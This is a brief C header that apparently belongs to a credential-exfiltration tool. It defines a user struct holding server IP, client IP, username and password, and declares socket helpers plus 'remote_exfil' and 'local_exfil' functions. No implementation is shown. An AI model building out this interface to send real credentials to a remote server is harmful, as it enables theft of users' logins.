#ifndef CIPHER_EXFIL_H
#define CIPHER_EXFIL_H

#include <stdint.h>
#include <stdio.h>

struct serv_info {
    const char *host;
    const int port;
};

struct user {
    const char *server_ip;
    const char *client_ip;
    const char *username;
    const char *password;
};

int server_connect();
ssize_t send_all(int socket_fd, const void *data, uint32_t len);
ssize_t recv_all(int socket_fd, void *buf, size_t len);
int send_message(int socket_fd, const void *data, size_t len);
int remote_exfil(const struct user *user);
int local_exfil(const struct user *user);

#endif //CIPHER_EXFIL_H
